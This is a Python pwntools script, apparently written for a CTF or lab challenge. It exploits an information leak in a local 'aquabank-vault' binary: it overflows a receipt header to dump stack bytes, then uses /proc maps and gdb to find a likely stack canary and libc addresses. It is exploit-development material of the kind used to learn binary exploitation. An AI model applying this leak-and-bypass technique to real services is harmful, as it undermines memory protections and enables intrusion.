#!/usr/bin/env python3
from pwn import *
import subprocess

p = process("./aquabank-vault")

# Trigger the leak
p.sendlineafter(b"> ", b"1")
p.sendafter(
    b"Type the receipt header (up to 64 chars):",
    b"A" * 64
)

p.recvuntil(b"--- RECEIPT ---\n")
leak = p.recvn(256)

# First 64 bytes are our input
extra = leak[64:]

# Read the process memory map
maps = open(f"/proc/{p.pid}/maps").readlines()


def find_map(address):
    for line in maps:
        parts = line.split()

        start, end = parts[0].split("-")
        start = int(start, 16)
        end = int(end, 16)

        if start <= address < end:
            file_offset = int(parts[2], 16)
            path = parts[-1] if len(parts) >= 6 else ""

            return start, file_offset, path

    return None


# Split the extra leak into 8-byte values
values = []

for i in range(0, len(extra), 8):
    value = u64(extra[i:i + 8])
    position = 64 + i

    values.append((position, value))


# Search for possible canaries
possible_canaries = []

for position, value in values:

    # Canary clues:
    # - not zero
    # - ends in 00
    # - is not a mapped address
    if (
        value != 0
        and value & 0xff == 0
        and find_map(value) is None
    ):
        possible_canaries.append((position, value))


print("\n=== LIKELY CANARY ===")

if possible_canaries:

    # Prefer a value that appears more than once
    canary_position, canary = possible_canaries[0]

    for position, value in possible_canaries:
        count = sum(1 for _, x in values if x == value)

        if count > 1:
            canary_position = position
            canary = value
            break

    print("Position:", canary_position)
    print("Value:   ", hex(canary))

else:
    print("No canary candidate found")


print("\n=== LIBC LEAKS ===")

for position, value in values:

    # Only check possible addresses starting with 0x7
    if not hex(value).startswith("0x7"):
        continue

    mapping = find_map(value)

    if mapping is None:
        continue

    start, file_offset, path = mapping

    # Only continue if the address is inside libc
    if "libc.so" not in path:
        continue

    libc_base = start - file_offset
    libc_offset = value - libc_base

    result = subprocess.run(
        [
            "gdb",
            "-q",
            path,
            "-batch",
            "-ex",
            f"info symbol {libc_offset:#x}"
        ],
        capture_output=True,
        text=True
    )

    print("Position:", position)
    print("Address: ", hex(value))
    print("Offset:  ", hex(libc_offset))
    print("Symbol:  ", result.stdout.strip())

p.close()